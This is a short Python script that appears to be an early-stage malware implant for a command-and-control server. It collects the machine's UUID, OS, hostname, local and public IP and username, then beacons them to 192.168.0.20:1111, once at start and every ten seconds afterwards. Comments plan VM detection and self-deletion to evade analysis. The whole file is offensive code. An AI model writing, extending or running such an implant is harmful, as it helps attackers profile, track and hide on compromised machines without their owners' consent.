import os
import sys
import time
from time import gmtime, strftime
import socket
import getpass
import uuid

# TO DO : Check internet connexion
# To DO : Auto Deletion in incorrect env
# To DO : Detect VM
# TO DO : Try expect and custom error

if sys.version_info[0] == 3:
    from urllib.request import urlopen
else:
    from urllib import urlopen

UUID = uuid.UUID(int=uuid.getnode())
Os = os.name
Computer = socket.gethostname()
Loacl_ip = socket.gethostbyname(socket.gethostname())
Hostname = getpass.getuser()

with urlopen("http://icanhazip.com/") as url:
    s = url.read()
    Public_ip = str(s)
    Public_ip = Public_ip.replace("b'","")[:-3]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.20", 1111))
date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
Chaine = "Init:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," +Public_ip
s.send(Chaine.encode())
s.close()

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.20", 1111))
    time.sleep(10)
    date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
    Chaine = "Alive:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
    s.send(Chaine.encode())
    print("[DEBUG] I'm Alive and seems connected to the C2 server.")
    s.close()
